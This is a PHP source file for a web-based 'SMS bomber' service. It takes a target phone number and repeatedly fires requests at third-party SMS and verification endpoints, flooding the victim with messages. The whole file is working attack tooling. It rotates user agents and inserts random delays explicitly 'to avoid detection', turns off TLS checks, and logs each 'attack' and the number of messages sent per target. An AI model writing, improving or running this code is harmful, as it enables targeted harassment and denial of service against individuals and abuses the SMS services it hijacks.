<?php
// ============================================
// SMS BOMBER CORE ENGINE - WEB VERSION
// ============================================

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

require_once 'config.php';

class SMSBomberWeb {
    private $endpoints;
    private $db;
    private $ip_address;
    
    public function __construct() {
        $this->ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
        $this->loadEndpoints();
        $this->db = new SQLite3(DB_PATH);
    }
    
    private function loadEndpoints() {
        $json = file_get_contents(__DIR__ . '/endpoints.json');
        $data = json_decode($json, true);
        $this->endpoints = $data['endpoints'];
    }
    
    private function checkRateLimit() {
        $stmt = $this->db->prepare("SELECT request_count FROM rate_limit 
                                    WHERE ip_address = :ip AND datetime(last_request) > datetime('now', '-1 hour')");
        $stmt->bindValue(':ip', $this->ip_address, SQLITE3_TEXT);
        $result = $stmt->execute();
        $row = $result->fetchArray();
        
        $count = $row ? $row['request_count'] : 0;
        
        if ($count >= MAX_REQUESTS_PER_IP) {
            return false;
        }
        
        // Update or insert
        if ($row) {
            $stmt2 = $this->db->prepare("UPDATE rate_limit SET request_count = request_count + 1, last_request = CURRENT_TIMESTAMP 
                                         WHERE ip_address = :ip");
            $stmt2->bindValue(':ip', $this->ip_address, SQLITE3_TEXT);
            $stmt2->execute();
        } else {
            $stmt2 = $this->db->prepare("INSERT INTO rate_limit (ip_address, request_count) VALUES (:ip, 1)");
            $stmt2->bindValue(':ip', $this->ip_address, SQLITE3_TEXT);
            $stmt2->execute();
        }
        
        return true;
    }
    
    private function logBombing($phone, $count) {
        $stmt = $this->db->prepare("INSERT INTO bombing_stats (target_phone, messages_sent, ip_address) 
                                    VALUES (:phone, :count, :ip)");
        $stmt->bindValue(':phone', $phone, SQLITE3_TEXT);
        $stmt->bindValue(':count', $count, SQLITE3_INTEGER);
        $stmt->bindValue(':ip', $this->ip_address, SQLITE3_TEXT);
        $stmt->execute();
    }
    
    private function sendRequest($endpoint, $phone) {
        $url = $endpoint['url'];
        $method = $endpoint['method'];
        $payload = [];
        
        // Replace {phone} placeholder with actual phone number
        foreach ($endpoint['payload'] as $key => $value) {
            $payload[$key] = str_replace('{phone}', $phone, $value);
        }
        
        // Random user agent
        $user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36'
        ];
        
        $headers = [
            'User-Agent: ' . $user_agents[array_rand($user_agents)],
            'Accept: application/json',
            'Accept-Language: en-US,en;q=0.9'
        ];
        
        // Add custom headers from endpoint config
        foreach ($endpoint['headers'] as $key => $value) {
            $headers[] = "$key: $value";
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        }
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $http_code == 200 || $http_code == 201 || $http_code == 202;
    }
    
    public function startBombing($phone, $threads = 10, $rounds = 100) {
        // Validate phone number
        if (!preg_match('/^\+?[0-9]{10,15}$/', $phone)) {
            return ['success' => false, 'error' => 'Invalid phone number format'];
        }
        
        // Ensure +91 prefix for India
        if (substr($phone, 0, 1) != '+') {
            $phone = '+91' . $phone;
        }
        
        // Check rate limit
        if (!$this->checkRateLimit()) {
            return ['success' => false, 'error' => 'Rate limit exceeded. Try again later.'];
        }
        
        $total_success = 0;
        $total_failed = 0;
        
        // Limit rounds to prevent abuse
        $rounds = min($rounds, MAX_MESSAGES_PER_TARGET / $threads);
        
        for ($i = 0; $i < $rounds; $i++) {
            foreach ($this->endpoints as $endpoint) {
                // Random delay to avoid detection
                usleep(rand(500000, 2000000)); // 0.5 to 2 seconds delay
                
                $success = $this->sendRequest($endpoint, $phone);
                if ($success) {
                    $total_success++;
                } else {
                    $total_failed++;
                }
            }
        }
        
        // Log the bombing attempt
        $this->logBombing($phone, $total_success);
        
        return [
            'success' => true,
            'phone' => $phone,
            'successful' => $total_success,
            'failed' => $total_failed,
            'total' => $total_success + $total_failed,
            'message' => "Bombing completed! $total_success SMS sent."
        ];
    }
    
    public function getStats($phone = null) {
        if ($phone) {
            $stmt = $this->db->prepare("SELECT SUM(messages_sent) as total FROM bombing_stats WHERE target_phone = :phone");
            $stmt->bindValue(':phone', $phone, SQLITE3_TEXT);
            $result = $stmt->execute();
            $row = $result->fetchArray();
            return ['phone' => $phone, 'total_messages' => $row['total'] ?? 0];
        } else {
            $result = $this->db->query("SELECT COUNT(*) as total_attacks, SUM(messages_sent) as total_messages FROM bombing_stats");
            $row = $result->fetchArray();
            return ['total_attacks' => $row['total_attacks'] ?? 0, 'total_messages' => $row['total_messages'] ?? 0];
        }
    }
}

// Handle API requests
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $bomber = new SMSBomberWeb();
    
    if (isset($input['action']) && $input['action'] == 'bomb') {
        $phone = $input['phone'] ?? '';
        $threads = min($input['threads'] ?? 10, 20);
        $rounds = min($input['rounds'] ?? 100, 200);
        
        $result = $bomber->startBombing($phone, $threads, $rounds);
        echo json_encode($result);
    } elseif (isset($input['action']) && $input['action'] == 'stats') {
        $phone = $input['phone'] ?? null;
        echo json_encode($bomber->getStats($phone));
    }
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['stats'])) {
    $bomber = new SMSBomberWeb();
    echo json_encode($bomber->getStats());
}
?>
